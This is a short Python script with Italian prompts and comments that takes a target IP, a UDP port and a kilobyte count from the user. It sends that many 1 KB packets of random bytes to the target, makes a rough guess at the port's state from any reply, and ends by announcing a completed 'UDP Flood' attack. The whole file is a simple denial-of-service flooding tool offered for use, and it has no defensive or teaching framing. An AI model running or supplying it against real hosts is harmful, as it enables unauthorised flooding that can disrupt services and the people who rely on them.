import socket
import random
import time

# =========================
# INPUT UTENTE
# =========================
target = input("Inserisci IP target: ")
port = int(input("Inserisci la porta UDP target: "))
kb_to_send = int(input("Quanti KB inviare? "))

PACKET_SIZE = 1024  # 1 KB
TIMEOUT = 2         # secondi

# =========================
# SOCKET UDP
# =========================
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(TIMEOUT)

# =========================
# PAYLOAD CASUALE
# =========================
def random_payload(size):
    return bytes(random.getrandbits(8) for _ in range(size))

# =========================
# INVIO DATI
# =========================
print(f"\n--- Invio UDP verso {target}:{port} ---\n")

try:
    for i in range(kb_to_send):
        payload = random_payload(PACKET_SIZE)
        sock.sendto(payload, (target, port))
        print(f"[>] Inviato pacchetto {i + 1} KB")

    # =========================
    # RICEZIONE RISPOSTA
    # =========================
    try:
        data, addr = sock.recvfrom(4096)
        print(f"\n[+] Risposta ricevuta da {addr} → Porta OPEN")
    except socket.timeout:
        print("\n[?] Nessuna risposta → Porta OPEN | FILTERED")

except socket.error as e:
    print(f"\n[-] Errore di rete / Porta CLOSED ({e})")

finally:
    sock.close()
    print("\n--- Attacco UDP Flood completato con successo ---")